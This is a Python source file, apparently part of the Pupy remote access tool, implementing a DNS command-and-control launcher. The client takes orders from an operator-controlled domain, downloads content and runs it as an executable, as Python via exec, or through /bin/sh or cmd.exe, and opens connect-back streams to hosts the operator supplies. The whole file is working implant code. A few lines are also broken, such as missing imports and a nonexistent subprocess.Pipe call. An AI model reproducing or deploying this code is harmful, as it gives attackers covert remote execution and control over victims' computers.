# -*- coding: utf-8 -*-
# Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)

from ..base_launcher import *
from ..picocmd import *

from threading import Thread, Event, Lock

import socket
import os

import logging
import subprocess

class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain):
        self.stream = None
        self.commands = []
        self.lock = Lock()
        self.new_commands = Event()

        try:
            from pupy_credentials import DNSCNC_PUB_KEY
            key = DNSCNC_PUB_KEY
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            key = credentials['DNSCNC_PUB_KEY']

        DnsCommandsClient.__init__(self, domain, key=key)

    def on_downloadexec_content(self, url, action, content):
        self.on_pastelink_content(url, action, content)

    def on_pastelink_content(self, url, action, content):
        if action.startswith('exec'):
            with tempfile.NamedTemporaryFile() as tmp:
                tmp.write(content)
                tmp.flush()
                if not platform.system == 'Windows':
                    os.chmod(tmp.name, 0700)
                subprocess.check_output(tmp.name, stderr=subprocess.STDOUT)
        elif action.startswith('pyexec'):
            try:
                exec content
            except Exception as e:
                logging.exception(e)
        elif action.startswith('sh'):
            try:
                pipe = None
                if platform.system == 'Windows':
                    kwargs = {
                        'stdin': subprocess.PIPE
                    }

                    if hasattr(subprocess, 'STARTUPINFO'):
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= \
                          subprocess.CREATE_NEW_CONSOLE | \
                          subprocess.STARTF_USESHOWWINDOW

                        kwargs.update({
                            'startupinfo': startupinfo,
                        })

                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
                else:
                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)

                pipe.stdin.write(content)
                pipe.stdin.close()
                pipe.communicate()

            except Exception as e:
                logging.exception(e)

    def on_checkconnect(self, host, port_start, port_end=None):
        pass

    def on_connect(self, ip, port, transport):
        with self.lock:
            self.commands.append(('connect', ip, port, transport))
            self.new_commands.set()

    def on_disconnect(self):
        with self.lock:
            if self.stream:
                self.stream.close()

    def on_exit(self):
        with self.lock:
            if self.stream:
                self.stream.close()

        os._exit(0)

class DNSCncLauncher(BaseLauncher):
    ''' Micro command protocol built over DNS infrastructure '''

    credentials = [ 'DNSCNC_PUB_KEY' ]

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
        super(DNSCncLauncher, self).__init__(*args, **kwargs)

    def init_argparse(self):
        self.arg_parser = LauncherArgumentParser(
            prog='dnscnc', description=self.__doc__
        )

        self.arg_parser.add_argument(
            '--domain',
            metavar='<domain>',
            required=True,
            help='controlled domain (hostname only, no IP, '
            	'you should properly setup NS first. Port is NOT supported)'
        )

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)
        self.set_host(self.args.domain)
        self.set_transport(None)

    def iterate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        dnscnc = DNSCommandClientLauncher(self.host)
        dnscnc.daemon = True

        logging.info('Activating CNC protocol. Domain: {}'.format(self.host))
        dnscnc.start()

        exited = False

        while not exited:
            command = None

            with dnscnc.lock:
                if dnscnc.commands:
                    command = dnscnc.commands.pop()
                else:
                    dnscnc.new_commands.clear()

            if not command:
                dnscnc.new_commands.wait()
                continue

            if command[0] == 'connect':
                _, host, port, transport = command
                t = network.conf.transports[transport](
                    bind_payload=self.connect_on_bind_payload
                )

                client = t.client()
                s = None
                stream = None

                try:
                    s = client.connect(host, port)
                    stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
                except socket.error as e:
                    logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
                        host, port, transport, e
                    ))
                finally:
                    with dnscnc.lock:
                        dnscnc.stream = stream

                if stream:
                    yield stream
